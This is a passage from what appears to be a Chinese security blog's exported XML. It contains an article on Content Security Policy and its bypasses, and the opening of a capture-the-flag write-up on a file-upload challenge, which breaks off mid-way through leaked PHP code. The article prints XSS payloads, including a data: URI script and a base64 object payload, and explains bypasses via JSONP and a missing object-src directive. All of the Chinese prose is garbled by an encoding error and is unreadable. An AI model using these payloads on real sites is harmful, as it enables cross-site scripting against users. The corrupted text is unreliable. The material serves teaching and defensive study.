<p>aï¼šè®©æ–‡ä»¶æˆ–ç›®å½•ä»…ä¾›é™„åŠ ç”¨é€”ã€‚<br>bï¼šä¸æ›´æ–°æ–‡ä»¶æˆ–ç›®å½•çš„æœ€åå­˜å–æ—¶é—´ã€‚<br>cï¼šå°†æ–‡ä»¶æˆ–ç›®å½•å‹ç¼©åå­˜æ”¾ã€‚<br>dï¼šå°†æ–‡ä»¶æˆ–ç›®å½•æ’é™¤åœ¨å€¾å€’æ“ä½œä¹‹å¤–ã€‚<br>iï¼šä¸å¾—ä»»æ„æ›´åŠ¨æ–‡ä»¶æˆ–ç›®å½•ã€‚<br>sï¼šä¿å¯†æ€§åˆ é™¤æ–‡ä»¶æˆ–ç›®å½•ã€‚<br>Sï¼šå³æ—¶æ›´æ–°æ–‡ä»¶æˆ–ç›®å½•ã€‚<br>uï¼šé¢„é˜²æ„å¤–åˆ é™¤ã€‚</p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>xssä¹‹CSPçš„åŸç†å’Œç»•è¿‡</title>
    <url>//posts/xss%E4%B9%8BCSP%E7%9A%84%E5%8E%9F%E7%90%86%E5%92%8C%E7%BB%95%E8%BF%87/</url>
    <content><![CDATA[<h1 id="CSPçš„åŸç†å’Œç»•è¿‡"><a href="#CSPçš„åŸç†å’Œç»•è¿‡" class="headerlink" title="CSPçš„åŸç†å’Œç»•è¿‡"></a>CSPçš„åŸç†å’Œç»•è¿‡</h1><p>xssçš„ç¼–ç é‚£ä¹ˆå¤æ‚ï¼Œä¸€ä¸å°å¿ƒå°±ä¼šè¿‡æ»¤å¤±è´¥ï¼ŒåŒæ—¶ä¸åŒçš„è§¦å‘ç‚¹è¿˜è¦é€ä¸ªä¿®å¤ã€å³ä½¿å¯ä»¥ç»Ÿå‰ç«¯è¿‡æ»¤ï¼Œä»å­˜åœ¨æ¼æ‰çš„é£é™©ã€‚é‚£ä¹ˆæœ‰æ²¡æœ‰ä¸€ç§åŠæ³•å¯ä»¥ç¦æ­¢ç”¨æˆ·æ’å…¥çš„jsä»£ç æ‰§è¡Œå‘¢ï¼Ÿæ˜¯æœ‰çš„ï¼Œè¿™å°±æ˜¯CSPï¼</p>
<p>CSPçš„å®ç°å’Œæ‰§è¡Œå…¨éƒ¨ç”±æµè§ˆå™¨å®Œæˆï¼Œæµè§ˆå™¨æ¥æ ¹æ®ä½ çš„è§„åˆ™ï¼Œç¦æ­¢å¼•å…¥å¤–éƒ¨çš„é‚£äº›é“¾æ¥å’Œæ’å…¥çš„jsä»£ç çš„æ‰§è¡Œï¼Œé‚£æ€ä¹ˆå‘Šè¯‰æµè§ˆå™¨æˆ‘è¦å¼€å¯CSPç­–ç•¥å‘¢ï¼Ÿ</p>
<h2 id="ä½¿ç”¨æ–¹æ³•"><a href="#ä½¿ç”¨æ–¹æ³•" class="headerlink" title="ä½¿ç”¨æ–¹æ³•"></a>ä½¿ç”¨æ–¹æ³•</h2><p>1ã€<strong>é€šè¿‡ HTTP å¤´ä¿¡æ¯çš„Content-Security-Policy</strong></p>
<figure class="highlight csp"><table><tr><td class="code"><pre><span class="line"><span class="attribute">Content-Security-Policy</span>: <span class="keyword">script-src</span> <span class="string">&#x27;self&#x27;</span>; <span class="keyword">object-src</span> <span class="string">&#x27;none&#x27;</span>; </span><br><span class="line"><span class="keyword">style-src</span> cdn.example.org third-party.org; <span class="keyword">child-src</span> https:</span><br></pre></td></tr></table></figure>
<span id="more"></span>
<p>2ã€<strong>é€šè¿‡ç½‘é¡µçš„metaæ ‡ç­¾ã€‚</strong></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;Content-Security-Policy&quot;</span> <span class="attr">content</span>=<span class="string">&quot;script-src &#x27;self&#x27;; object-src &#x27;none&#x27;; style-src cdn.example.org third-party.org; child-src https:&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h2 id="CSPç­–ç•¥å­—æ®µ"><a href="#CSPç­–ç•¥å­—æ®µ" class="headerlink" title="CSPç­–ç•¥å­—æ®µ"></a>CSPç­–ç•¥å­—æ®µ</h2><p>æˆ‘ä»¬åœ¨ç½‘ç«™çš„å“åº”å¤´é‡å¯ä»¥çœ‹åˆ°ä¸€èˆ¬CSPçš„HTTP Headeré•¿è¿™æ ·ï¼š</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="attribute">Content-Security-Policy</span>:Â </span><br><span class="line">base-uri &#x27;self&#x27;;</span><br><span class="line">object-src &#x27;self&#x27;;</span><br><span class="line">script-src &#x27;self&#x27; &#x27;unsafe-eval&#x27; &#x27;unsafe-inline&#x27; &#x27;report-sample&#x27; *.xxx.com;Â </span><br><span class="line">frame-src &#x27;self&#x27; *.xxx.com;</span><br><span class="line">report-uri https://xxx.log.xxx.com</span><br></pre></td></tr></table></figure>

<p>å¸¸ç”¨çš„CSPå­—æ®µè¡¨ï¼š</p>
<table>
<thead>
<tr>
<th align="left">æŒ‡ä»¤</th>
<th align="left">è¯´æ˜</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><strong>default-src</strong></td>
<td align="left">é’ˆå¯¹ <code>xxx-src</code> æŒ‡ä»¤çš„é»˜è®¤è¡Œä¸º</td>
</tr>
<tr>
<td align="left"><strong>script-src</strong></td>
<td align="left">é™åˆ¶è„šæœ¬åŠ è½½ç™½åå•</td>
</tr>
<tr>
<td align="left"><strong>base-uri</strong></td>
<td align="left">æŒ‡å®š <code>&lt;base&gt;</code> æ ‡ç­¾çš„ url çš„å€¼</td>
</tr>
<tr>
<td align="left"><strong>child-src</strong></td>
<td align="left">é™åˆ¶å†…åµŒæ¡†æ¶ï¼Œæ¯”å¦‚ frameï¼Œ iframe çš„åŸŸåç™½åå•</td>
</tr>
<tr>
<td align="left"><strong>connect-src</strong></td>
<td align="left">é™å®šå¯¹å¤–è¯·æ±‚åŸŸåçš„ç™½åå• (é€šè¿‡ XHRã€WebSocketsã€EventSourceç­‰)</td>
</tr>
<tr>
<td align="left"><strong>font-src</strong></td>
<td align="left">é™å®šå­—ä½“æ–‡ä»¶çš„è¯·æ±‚åŸŸåç™½åå•</td>
</tr>
<tr>
<td align="left"><strong>form-action</strong></td>
<td align="left">é™å®š <code>&lt;form&gt;</code> æ ‡ç­¾è¡¨å•æäº¤çš„ç™½åå•ï¼Œå°±æ˜¯ action çš„åŸŸåç™½åå•</td>
</tr>
<tr>
<td align="left"><strong>frame-ancestors</strong></td>
<td align="left">æŒ‡å®šå¯ä»¥åµŒå…¥å½“å‰é¡µé¢çš„å¤–éƒ¨èµ„æºã€‚ è¯¥æŒ‡ä»¤é€‚ç”¨äº <code>&lt;frame&gt;</code>ã€<code>&lt;iframe&gt;</code>ã€<code>&lt;embed&gt;</code> å’Œ <code>&lt;applet&gt;</code> æ ‡è®°ã€‚ è¯¥æŒ‡ä»¤ä¸èƒ½åœ¨ <code>&lt;meta&gt;</code> æ ‡è®°ä¸­ä½¿ç”¨ï¼Œå¹¶ä¸”ä»…é€‚ç”¨äºé HTML èµ„æºã€‚</td>
</tr>
<tr>
<td align="left"><strong>frame-src</strong></td>
<td align="left">ç­‰åŒäº child-srcï¼Œåœ¨ç¬¬äºŒç‰ˆåºŸå¼ƒè¿‡ï¼Œç¬¬ä¸‰ç‰ˆåˆæ¢å¤</td>
</tr>
<tr>
<td align="left"><strong>img-src</strong></td>
<td align="left">é™å®šå›¾ç‰‡åŠ è½½åŸŸåç™½åå•</td>
</tr>
<tr>
<td align="left"><strong>media-src</strong></td>
<td align="left">é™å®šè§†é¢‘å’ŒéŸ³é¢‘çš„åŠ è½½åŸŸåç™½åå•</td>
</tr>
<tr>
<td align="left"><strong>object-src</strong></td>
<td align="left">æ’ä»¶åŠ è½½ç™½åå•ï¼Œæ¯”å¦‚ flash</td>
</tr>
<tr>
<td align="left"><strong>plugin-types</strong></td>
<td align="left">é™åˆ¶å¯ä»¥ä½¿ç”¨çš„æ’ä»¶æ ¼å¼</td>
</tr>
<tr>
<td align="left"><strong>report-uri</strong></td>
<td align="left">æŒ‡å®šå½“è¿åå†…å®¹å®‰å…¨ç­–ç•¥æ—¶æµè§ˆå™¨å°†å‘é€æŠ¥å‘Šçš„ URLã€‚ æ­¤æŒ‡ä»¤ä¸èƒ½åœ¨ æ ‡è®°ä¸­ä½¿ç”¨ã€‚ ä¸‹é¢æœ‰ demo æ¼”ç¤º</td>
</tr>
<tr>
<td align="left"><strong>style-src</strong></td>
<td align="left">æ ·å¼è¡¨åŠ è½½ç™½åå•</td>
</tr>
<tr>
<td align="left"><strong>upgrade-insecure-requests</strong></td>
<td align="left">è‡ªåŠ¨å°†ç½‘é¡µä¸Šæ‰€æœ‰åŠ è½½å¤–éƒ¨èµ„æºçš„ HTTP é“¾æ¥æ¢æˆ HTTPS åè®®</td>
</tr>
<tr>
<td align="left"><strong>worker-src</strong></td>
<td align="left">é™åˆ¶ worker åŠ è½½ç™½åå•(åŒ…å« shared workerï¼Œservice worker)ï¼Œ ç¬¬ä¸‰ç‰ˆæ‰æœ‰ï¼Œ æ”¯æŒæœ‰é™</td>
</tr>
</tbody></table>
<p>å¯¹äºä¸åŒçš„srcåˆ†åˆ«è®¾ç½®æœ‰æ—¶å€™æ˜¯ç¹æ‚çš„ã€‚å¯ä»¥é€šè¿‡default-srcç»Ÿä¸€è®¾ç½®é»˜è®¤ã€‚å½“default-srcè®¾ç½®æ—¶ï¼Œä»»ä½•xxx-srcå¦‚æœæ²¡æœ‰è®¾ç½®ï¼Œå³ä¸ºdefault-srcçš„ç­–ç•¥ï¼Œå¦‚æœè®¾ç½®åˆ™è¦†ç›–default-srcçš„ç­–ç•¥ã€‚</p>
<h3 id="CSPç‰¹æ®Šè®¾ç½®å­—æ®µ"><a href="#CSPç‰¹æ®Šè®¾ç½®å­—æ®µ" class="headerlink" title="CSPç‰¹æ®Šè®¾ç½®å­—æ®µ"></a>CSPç‰¹æ®Šè®¾ç½®å­—æ®µ</h3><h4 id="unsafe-inline-å«ä¹‰"><a href="#unsafe-inline-å«ä¹‰" class="headerlink" title="unsafe-inline å«ä¹‰"></a>unsafe-inline å«ä¹‰</h4><p>unsafe-inlineå…è®¸å†…è”çš„jså’Œcssçš„æ‰§è¡Œï¼Œæ¯”å¦‚onäº‹ä»¶ã€javascriptä¼ªåè®®scriptæ ‡ç­¾å†…ä»£ç ç­‰ã€‚å¦‚æœä¸å£°æ˜æ­¤å­—æ®µï¼Œå¾ˆå¤šç½‘ç«™çš„åŠŸèƒ½å¯èƒ½ä¼šå¼‚å¸¸ã€‚ä½†æ˜¯è¿™å¹¶ä¸æ˜¯CSPçš„ç¼ºé™·ï¼Œè€Œæ˜¯å¼€å‘ç¼–ç çš„é—®é¢˜ï¼Œå¦‚æœå¯ä»¥åšåˆ°ç»Ÿä¸€ä¸ä½¿ç”¨å†…è”jsï¼Œæ¯”å¦‚ç¼–æ’å¥½ä½¿ç”¨çš„jsæ–‡ä»¶ï¼Œä¸ä½¿ç”¨å†…è”å‡½æ•°ï¼Œå…³é—­unsafe-inlineå³å¯é˜²æ­¢ç»å¤§å¤šæ•°çš„xssã€‚</p>
<p>å½“ç„¶ä¹Ÿæœ‰å¦ä¸€ç§æ–¹æ³•å¯ä»¥åœ¨ä¸å®ç”¨unsafe-inlineçš„æƒ…å†µä¸‹æ‰§è¡Œjsä»£ç ï¼Œæ¯”å¦‚ï¼š</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&#x27;Hello, world.&#x27;</span>);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span> </span><br></pre></td></tr></table></figure>
<p>è¿™ä¸ªä»£ç çš„å“ˆå¸Œå€¼è®¡ç®—ç»“æœæ”¾åœ¨ CSP é‡Œé¢ï¼š<br>Content-Security-Policy: script-src â€˜sha256-qznLcsROx4GACP2dm0UCKCzCG-HiZ1guq6ZZDob_Tng&#x3D;â€™</p>
<p>ä½†æ˜¯å³ä½¿ç¦ç”¨äº†unsafe-inline script-srcè¿˜æœ‰å¦ä¸€ä¸ªæ”»å‡»é¢ï¼š dataï¼šsrc</p>
<p>å½“dateå¯ç”¨æ—¶ä¹Ÿä¼šé€ æˆxssçš„æ”»å‡»</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;data:text/javascript,evil()&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h4 id="unsafe-evalå«ä¹‰"><a href="#unsafe-evalå«ä¹‰" class="headerlink" title="unsafe-evalå«ä¹‰"></a>unsafe-evalå«ä¹‰</h4><p>unsafe-evalå…è®¸å°†å­—ç¬¦ä¸²é‡æ–°è½¬ä¸ºå¯æ‰§è¡Œä»£ç ï¼Œæ¯”è¾ƒé«˜é£é™©ï¼Œå¦‚æ— å¿…è¦ï¼Œä¹Ÿæ˜¯ç¦æ­¢å¼€æ”¾ã€‚</p>
<h4 id="object-src"><a href="#object-src" class="headerlink" title="object-src"></a>object-src</h4><p>å¦‚æœæ²¡æœ‰default-srcè®¾ç½®çš„è¯ï¼Œobject-srcå¿…é¡»è®¾ç½®ï¼Œå› ä¸ºFlash é‡Œé¢å¯ä»¥æ‰§è¡Œå¤–éƒ¨è„šæœ¬ã€‚ä¼šå¯¼è‡´å„ç§å®‰å…¨é—®é¢˜ã€‚</p>
<h3 id="JSONP"><a href="#JSONP" class="headerlink" title="JSONP"></a>JSONP</h3><p>å¿…é¡»ç‰¹åˆ«æ³¨æ„ JSONP çš„å›è°ƒå‡½æ•°ã€‚å› ä¸ºå†å¤šæ¬¡æµ‹è¯•ä¸­å‘ç°ï¼Œjsonpçš„å›è°ƒå‡½æ•°ä¸€èˆ¬æ˜¯å¯æ§çš„ï¼Œè¿™ç§åŒåŸŸåä¸‹çš„å¯æ§å›è°ƒä¼šå¯¼è‡´CSPç­–ç•¥çš„å¤±æ•ˆã€‚æ¯”å¦‚ä½ é™åˆ¶äº†å¿…éœ€æ˜¯ç½‘ç«™å­åŸŸåï¼Œæ­£å¥½å­åŸŸåä¸­æœ‰ä¸€ä¸ªjsonpå›è°ƒå‡½æ•°å¯æ§ï¼Œé‚£ä¹ˆå°±æœ‰äº†åŠ è½½ä»»æ„jsçš„èµ„æºç‚¹ã€‚</p>
<p>ä¸€æ—¦myCallbackå‚æ•°å¯æ§ä¸”åœ¨è¿”å›ä¸­ï¼Œé‚£ä¹ˆè¿”å›çš„jsä»£ç å°±å¯æ§äº†ã€‚</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&lt;! DOCTYPE html &gt;</span><br><span class="line">&lt; html lang=&quot;en&quot; &gt;</span><br><span class="line">&lt; head &gt;</span><br><span class="line">Â  Â  &lt; meta charset=&quot;UTF-8&quot; &gt;</span><br><span class="line">Â  Â  &lt; title &gt; jsonpä¸‹XSSæ³¨å…¥ &lt; /title&gt;</span><br><span class="line">&lt; /head&gt;</span><br><span class="line">&lt; body &gt;</span><br><span class="line">&lt; script &gt;</span><br><span class="line">Â  Â  function myCallback(jsonObject) &#123;</span><br><span class="line">Â  Â  Â  Â  //å‡½æ•°å†…å®¹</span><br><span class="line">Â  Â  &#125;</span><br><span class="line">&lt; script src=&quot;https://xxx.com?callback=myCallback&quot; &gt;<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">&lt; /body&gt;</span><br><span class="line">&lt; /html&gt;</span><br></pre></td></tr></table></figure>





<h2 id="CSPçš„é”™è¯¯é…ç½®å’Œç»•è¿‡"><a href="#CSPçš„é”™è¯¯é…ç½®å’Œç»•è¿‡" class="headerlink" title="CSPçš„é”™è¯¯é…ç½®å’Œç»•è¿‡"></a>CSPçš„é”™è¯¯é…ç½®å’Œç»•è¿‡</h2><p>æ¨èä¸€ä¸ªåˆ†æCSPç­–ç•¥ç¼ºé™·çš„åœ¨çº¿å·¥å…·ï¼š<a href="https://csp-evaluator.withgoogle.com/">https://csp-evaluator.withgoogle.com/</a></p>
<h3 id="ä¸ºäº†æ­£å¸¸åŠŸèƒ½ä½¿ç”¨unsafe-inline"><a href="#ä¸ºäº†æ­£å¸¸åŠŸèƒ½ä½¿ç”¨unsafe-inline" class="headerlink" title="ä¸ºäº†æ­£å¸¸åŠŸèƒ½ä½¿ç”¨unsafe-inline"></a>ä¸ºäº†æ­£å¸¸åŠŸèƒ½ä½¿ç”¨unsafe-inline</h3><p>å¦‚ä¸‹é¢çš„ç­–ç•¥ä½¿ç”¨äº†unsafe-inlineå°±å¯ä»¥äº‰äº§çš„xssæ³¨å…¥äº†</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="attribute">Content-Security-Policy</span><span class="punctuation">: </span>script-src https://sina.com https://baidu.com &#x27;unsafe-inline&#x27; child-src &#x27;none&#x27;; report-uri /Report-parsing-url;</span><br></pre></td></tr></table></figure>
<h3 id="å¿˜è®°é…ç½®object-src"><a href="#å¿˜è®°é…ç½®object-src" class="headerlink" title="å¿˜è®°é…ç½®object-src"></a>å¿˜è®°é…ç½®object-src</h3><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="attribute">Content-Security-Policy</span><span class="punctuation">: </span>script-src https://sina.com https://baidu.com &#x27;unsafe-inline&#x27;; report-uri /Report-parsing-url;</span><br></pre></td></tr></table></figure>
<p>ä¸Šé¢çš„ä»£ç æ²¡æœ‰é…ç½®object-srcå±æ€§ï¼Œå¯èƒ½ä¼šå¯¼è‡´flashç›¸å…³çš„å®‰å…¨é—®é¢˜,ä»¥ä¸‹å‡ ç§æ ‡ç­¾éƒ½å¯ä»¥åŠ è½½flashã€‚</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">embed</span> <span class="attr">src</span>=<span class="string">&quot;https://not-example.com/flash&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">embed</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">object</span> <span class="attr">data</span>=<span class="string">&quot;https://not-example.com/plugin&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">object</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">applet</span> <span class="attr">archive</span>=<span class="string">&quot;https://not-example.com/java&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">applet</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">object</span> <span class="attr">data</span>=<span class="string">&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="jsonpç»•è¿‡CSP"><a href="#jsonpç»•è¿‡CSP" class="headerlink" title="jsonpç»•è¿‡CSP"></a>jsonpç»•è¿‡CSP</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">Content-Security-Policy:script-src â€˜selfâ€™ accounts.google.com/random/ website.with.redirect.com; object-src â€˜noneâ€™; report-uri /Report-parsing-url;</span><br></pre></td></tr></table></figure>
<p>å¦‚æœç™½åå•å†…çš„åŸŸåå­˜åœ¨jsonpå›è°ƒå‡½æ•°å¯æ“çºµçš„æ¼æ´ï¼Œå°±ä¼šé€ æˆCSPçš„ç»•è¿‡ã€‚</p>
<h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><ul>
<li><a href="https://web.dev/csp/#policy-applies-to-a-wide-variety-of-resources">https://web.dev/csp/#policy-applies-to-a-wide-variety-of-resources</a></li>
</ul>
]]></content>
      <categories>
        <category>webå®‰å…¨</category>
      </categories>
      <tags>
        <tag>webå®‰å…¨</tag>
      </tags>
  </entry>
  <entry>
    <title>ç½‘é¼æ¯web-WP-AK</title>
    <url>//posts/%E7%BD%91%E9%BC%8E%E6%9D%AF-web-wep-AK/</url>
    <content><![CDATA[<h2 id="ç½‘é¼æ¯æ¯”èµ›æ„Ÿæƒ³"><a href="#ç½‘é¼æ¯æ¯”èµ›æ„Ÿæƒ³" class="headerlink" title="ç½‘é¼æ¯æ¯”èµ›æ„Ÿæƒ³"></a>ç½‘é¼æ¯æ¯”èµ›æ„Ÿæƒ³</h2><p><strong>æ°´æµ…ç‹å…«å¤šï¼ŒpythonçœŸæ˜¯å¤šã€‚</strong> ç™½è™ç»„ä¹Ÿå¤ªå·äº†ï¼Œé‡‘èè¡Œä¸šå°¤å…¶å·ï¼Œèƒ½åšå‡ºæ¥cryptoå’Œwebæˆ‘èƒ½ç†è§£ï¼Œpwnã€reverseéƒ½æ˜¯å¼ºé¡¹ï¼Œæ¯”webè¿˜å¼ºï¼Œé‚£æ˜¯å¹³å¸¸ä¸å¹²ä¸šåŠ¡å—ï¼Ÿéš¾ä»¥ç†è§£ï¼Œè€Œä¸”ç°åœ¨æ¯”èµ›éƒ½ä¸æ˜¯pwnçˆ¹äº†ï¼Œé‚£æ˜¯pwnçˆ·çˆ·ï¼Œakäº†webï¼Œè¿˜åšäº†miscå’Œcryptoï¼Œæœ€ååªæœ‰ä¸‰å››ç™¾åˆ†ï¼Œä¸€é“pwné¢˜å°±æ˜¯400å¤šåˆ†ï¼Œä¸€é“pwnå°±èƒ½è¿›çº¿ä¸‹ã€‚ç°åœ¨webç‹—çœŸæ˜¯æ²¡å•¥æ´»è·¯ã€‚</p>
<p>åæ§½å½’åæ§½ï¼Œä½†æ˜¯è¿˜æ˜¯æŠ€ä¸å¦‚äººã€‚ä¸è¿‡è¿™æ¬¡ç™½è™ç»„webåŸºæœ¬éƒ½åšå‡ºæ¥äº†ã€‚å…ˆè®°å½•ä¸‹WPå§ï¼</p>
<span id="more"></span>

<h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><p>ä¸€å…±æœ‰ä¸‰ä¸ªwebé¢˜ç›®ï¼Œéƒ½æ˜¯åºå·å½¢å¼çš„ï¼Œä¸‹é¢æˆ‘å°±éšæ„å‘½åäº†ï¼Œä¸»è¦æ˜¯è®°å½•ä¸‹æ€è·¯ã€‚</p>
<h3 id="ç»•è¿‡ä¸€å †é™åˆ¶è¿›è¡Œæ–‡ä»¶ä¸Šä¼ "><a href="#ç»•è¿‡ä¸€å †é™åˆ¶è¿›è¡Œæ–‡ä»¶ä¸Šä¼ " class="headerlink" title="ç»•è¿‡ä¸€å †é™åˆ¶è¿›è¡Œæ–‡ä»¶ä¸Šä¼ "></a>ç»•è¿‡ä¸€å †é™åˆ¶è¿›è¡Œæ–‡ä»¶ä¸Šä¼ </h3><p>é¦–å…ˆæ˜¯æ‰«æç›®å½•å‘ç°gitæ³„æ¼ã€‚</p>
<p>æ ¸å¿ƒå‡½æ•°åœ¨application controlleré‡Œé¢,æºç å¦‚ä¸‹</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">app</span>\<span class="title class_">index</span>\<span class="title class_">controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;&lt;form method=&quot;post&quot; enctype=&quot;multipart/form-data&quot; action=&#x27;</span>.<span class="title function_ invoke__">url</span>(<span class="string">&#x27;index/index/upload&#x27;</span>).<span class="string">&#x27;&gt;</span></span><br><span class="line"><span class="string">            &lt;input type=&quot;file&quot; name=&quot;hw_file&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;input type=&quot;submit&quot; value=&quot;ä¸Šä¼ &quot;&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upload</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">request</span>()-&gt;<span class="title function_ invoke__">isPost</span>())&#123;</span><br><span class="line">            <span class="variable">$file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;hw_file&#x27;</span>]??<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">            <span class="keyword">if</span>(!<span class="variable">$file</span>)&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="title function_ invoke__">json</span>([<span class="string">&#x27;code&#x27;</span>=&gt;<span class="number">0</span>,<span class="string">&#x27;msg&#x27;</span>=&gt;<span class="string">&#x27;è¯·é€‰æ‹©æ–‡ä»¶&#x27;</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$file_name</span> = <span class="variable">$file</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">            <span class="variable">$file_tmp</span> = <span class="variable">$file</span>[<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$file_size</span> = <span class="variable">$file</span>[<span class="string">&#x27;size&#x27;</span>];</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$file_size</span> &gt; <span class="number">1024</span>*<span class="number">1024</span>*<span class="number">2</span>)&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="title function_ invoke__">json</span>([<span class="string">&#x27;code&#x27;</span>=&gt;<span class="number">0</span>,<span class="string">&#x27;msg&#x27;</span>=&gt;<span class="string">&#x27;æ–‡ä»¶å¤§å°ä¸èƒ½è¶…è¿‡2M&#x27;</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$file_error</span> = <span class="variable">$file</span>[<span class="string">&#x27;error&#x27;</span>];</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$file_error</span> &gt; <span class="number">0</span>)&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="title function_ invoke__">json</span>([<span class="string">&#x27;code&#x27;</span>=&gt;<span class="number">0</span>,<span class="string">&#x27;msg&#x27;</span>=&gt;<span class="string">&#x27;ä¸Šä¼ å¤±è´¥&#x27;</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$file_type</span> = <span class="variable">$file</span>[<span class="string">&#x27;type&#x27;</span>];</span><br><span class="line">            <span class="variable">$file_ext</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;.&#x27;</span>,<span class="variable">$file_name</span>);</span><br><span class="line">            <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strtolower</span>(<span class="title function_ invoke__">end</span>(<span class="variable">$file_ext</span>));</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">strstr</span>(<span class="variable">$file_type</span>, <span class="string">&quot;image/&quot;</span>))&#123;</span><br><span class="line">                <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">upload_as_image</span>(<span class="variable">$file_ext</span>, <span class="variable">$file_tmp</span>, <span class="string">&quot;../uploads/images/&quot;</span>.<span class="title function_ invoke__">date</span>(<span class="string">&#x27;YmdHis&#x27;</span>).<span class="string">&quot;/&quot;</span>, [<span class="string">&quot;gif&quot;</span>], <span class="title function_ invoke__">request</span>()-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&quot;hw_file_name&quot;</span>)??<span class="literal">FALSE</span>))&#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="title function_ invoke__">json</span>([<span class="string">&#x27;code&#x27;</span>=&gt;<span class="number">1</span>,<span class="string">&#x27;msg&#x27;</span>=&gt;<span class="string">&#x27;ä¸Šä¼ æˆåŠŸ&#x27;</span>]);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="title function_ invoke__">json</span>([<span class="string">&#x27;code&#x27;</span>=&gt;<span class="number">0</span>,<span class="string">&#x27;msg&#x27;</span>=&gt;<span class="string">&#x27;ä¸Šä¼ å¤±è´¥&#x27;</span>]);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">upload_as_text</span>(<span class="variable">$file_ext</span>, <span class="variable">$file_tmp</span>, <span class="string">&quot;../uploads/files/&quot;</span>.<span class="title function_ invoke__">date</span>(<span class="string">&#x27;YmdHis&#x27;</span>).<span class="string">&quot;/&quot;</span>, <span class="title function_ invoke__">request</span>()-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&quot;hw_file_name&quot;</span>)??<span class="literal">FALSE</span>))&#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="title function_ invoke__">json</span>([<span class="string">&#x27;code&#x27;</span>=&gt;<span class="number">1</span>,<span class="string">&#x27;msg&#x27;</span>=&gt;<span class="string">&#x27;ä¸Šä¼ æˆåŠŸ&#x27;</span>]);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="title function_ invoke__">json</span>([<span class="string">&#x27;code&#x27;</span>=&gt;<span class="number">0</span>,<span class="string">&#x27;msg&#x27;</span>=&gt;<span class="string">&#x27;ä¸Šä¼ å¤±è´¥&#x27;</span>]);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="title function_ invoke__">json</span>([<span 